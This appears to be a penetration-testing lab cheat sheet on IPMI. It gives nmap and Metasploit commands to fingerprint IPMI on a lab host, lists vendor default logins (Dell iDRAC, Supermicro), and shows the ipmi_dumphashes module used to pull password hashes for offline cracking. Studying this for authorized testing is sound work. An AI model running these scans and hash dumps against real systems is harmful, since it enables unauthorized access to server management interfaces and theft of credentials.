#IPMI

Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring.

Examples: HP iLO, Dell DRAC, and Supermicro IPMI

Scanning the target
```
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

A metasploit scanner
```
use auxiliary/scanner/ipmi/ipmi_version 
```

Default passwords:
Dell iDRAC	    root            calvin
HP iLO	        Administrator	randomized 8-character string consisting of numbers and uppercase letters
Supermicro IPMI	ADMIN	ADMIN

A critical flaw in the protocol exposes the HASH of the credentials when an unauthenticated client communicates to the server. We can sniff this and then crackk the hash offline

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes 
set rhosts 10.129.42.195
show options
run
```